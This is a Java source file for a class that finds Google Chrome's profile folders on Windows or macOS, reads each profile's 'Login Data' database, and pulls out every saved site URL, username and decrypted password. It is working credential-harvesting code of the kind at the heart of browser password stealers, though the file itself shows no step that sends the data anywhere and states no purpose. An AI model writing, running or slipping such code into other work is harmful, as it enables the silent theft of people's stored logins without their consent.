package random.chrom;

import org.json.JSONObject;
import random.util.OperatingSystem;

import java.io.File;
import java.io.IOException;
import java.lang.invoke.MethodHandles;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.sql.Connection;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;
import java.util.Map;
import java.util.logging.Level;
import java.util.logging.Logger;
import java.util.stream.Collectors;

public class ChromeDatabase {
    private static final Logger LOG = Logger.getLogger(MethodHandles.lookup().lookupClass().getName());
    private static final String LOGIN_QUERY = "SELECT action_url, username_value, password_value FROM logins";

    private final SqliteDB sqliteDB;

    public ChromeDatabase() {
        sqliteDB = new SqliteDB();
    }

    public Map<String, List<ChromeAccountEntry>> getProfiles() throws Exception {
        Path chromeInstallPath = getChromeInstallPath();
        return getChromeProfiles().stream()
                .collect(Collectors.toMap(ChromeProfile::name, profile -> {
                    File loginDataFile = new File(chromeInstallPath + File.separator + profile.profileName(), "Login Data");
                    return getChromeAccountsFromDatabaseFile(loginDataFile);
                }));
    }

    private List<ChromeProfile> getChromeProfiles() throws Exception {
        Path chromeInstallPath = getChromeInstallPath();
        File chromeInfo = new File(chromeInstallPath.toString(), "Local State");
        List<ChromeProfile> chromeProfiles;
        final String[] infoLines = Files.readAllLines(Paths.get(chromeInfo.toURI())).toArray(new String[]{});
        switch (OperatingSystem.getOperatingSystem()) {
            case WINDOWS -> chromeProfiles = readProfiles(infoLines);
            case MAC -> {
                final String line = infoLines[0];
                final String[] lines = line.split("\\{|\\}");
                chromeProfiles = readProfiles(lines);
            }
            default -> throw new Exception(System.getProperty("os.name") + " is not supported by this application!");
        }
        return chromeProfiles;
    }

    private ChromeAccountEntry getChromeAccount(ResultSet results) {
        try {
            String username = results.getString("username_value");
            String password = ChromeSecurity.getPassword(results);
            String url = results.getString("action_url");
            return new ChromeAccountEntry(username, password, url);
        } catch (Exception e) {
            LOG.log(Level.SEVERE, e.getMessage(), e);
        }
        return null;
    }

    private List<ChromeAccountEntry> getChromeAccountsFromDatabaseFile(File dbFile) {
        try (Connection connection = sqliteDB.connectToTempDB(dbFile, "CHROME_LOGIN_")) {
            return getChromeAccountsFromConnection(connection);
        } catch (Exception e) {
            return Collections.emptyList();
        }
    }

    private List<ChromeAccountEntry> getChromeAccountsFromConnection(Connection connection) throws Exception {
        try {
            if (connection.isClosed()) {
                throw new IOException("Connection to database has been terminated! Cannot fetch accounts.");
            }
        } catch (SQLException e) {
            throw new IOException("Connection status to the database could not be determined. Has chrome updated?");
        }
        List<ChromeAccountEntry> accounts = new ArrayList<>();
        try (ResultSet resultSet = connection.createStatement().executeQuery(LOGIN_QUERY)) {
            while (resultSet.next()) {
                accounts.add(getChromeAccount(resultSet));
            }
        } catch (SQLException e) {
            throw new IOException("Error reading database. Is the file corrupted?");
        }
        return accounts;
    }

    private Path getChromeInstallPath() throws Exception {
        final OperatingSystem os = OperatingSystem.getOperatingSystem();
        if (os == OperatingSystem.UNKNOWN) {
            throw new Exception(System.getProperty("os.name") + " is not supported by this application!");
        }
        Path chromeInstall = Paths.get(os.getChromePath());
        if (Files.notExists(chromeInstall)) {
            throw new IOException("Google chrome installation not found.");
        }
        return chromeInstall;
    }

    private List<ChromeProfile> readProfiles(String[] profilesLines) {
        JSONObject infoCache = new JSONObject(profilesLines[0])
                .getJSONObject("profile")
                .getJSONObject("info_cache");

        return infoCache.keySet().stream()
                .map(profileName -> {
                    JSONObject userProfile = infoCache.getJSONObject(profileName);
                    String name = userProfile.getString("user_name");
                    String gaiaName = userProfile.getString("gaia_name");
                    return new ChromeProfile(name, gaiaName, profileName);
                }).toList();
    }
}
